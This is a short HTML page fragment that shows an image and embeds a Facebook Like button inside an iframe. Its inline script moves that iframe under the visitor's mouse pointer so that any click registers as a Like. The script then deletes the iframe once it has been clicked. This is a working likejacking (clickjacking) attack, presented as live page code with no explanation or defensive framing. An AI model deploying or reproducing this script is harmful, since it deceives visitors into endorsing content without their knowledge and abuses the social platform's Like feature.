<img src="https://i.pinimg.com/originals/6e/ba/ce/6ebacece4263adfe998cda3d6ed2ef80.jpg">
<iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2F114330216615146&layout=button_count&show_faces=false&width=110&action=like&colorscheme=light&height=21" style="border:none; overflow:hidden; width:110px; height:21px; padding-top:1px; position:absolute;" scrolling="no" id="facebooklike" frameborder="0">
 </iframe>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script>
    <script>




      $(document).mousemove(function(e) {
  $('#facebooklike').css('left', (e.pageX-20) + 'px');
  $('#facebooklike').css('top', (e.pageY-10) + 'px');
});





var inIframe = false;
function checkClick() {
  if (document.activeElement && document.activeElement === document.getElementById("facebooklike")) {
     if (inIframe == false) {
        $('#facebooklike').remove();
        inIframe = true;
     }
  } else {
     inIframe = false;
  }
}
setInterval(checkClick, 1000);





    </script>
